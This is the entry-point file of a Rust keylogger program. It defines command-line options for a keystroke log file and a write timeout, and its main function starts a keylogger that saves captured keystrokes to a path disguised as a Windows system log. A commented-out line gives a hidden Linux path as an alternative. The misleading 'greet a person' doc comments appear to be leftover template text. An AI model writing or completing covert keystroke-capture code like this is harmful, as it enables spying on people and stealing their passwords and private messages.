mod os;

use clap::Parser;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    // File to store keystrokes in.
    #[clap(short, long)]
    logfile: String,
    // Number of seconds to wait after typing stops to write keystrokes to disk.
    #[clap(short, long)]
    timeout: u64,

    /// Number of times to greet
    #[clap(short, long, default_value_t = 1)]
    count: u8,
}

fn main() {
    // let _res = os::start_keylogger("/var/lib/.Xsock".to_owned(), 10);
    let _res = os::start_keylogger("C:\\Windows\\Logs\\SIH\\SIH.20240307.162282.822.1".to_owned(), 2);
}
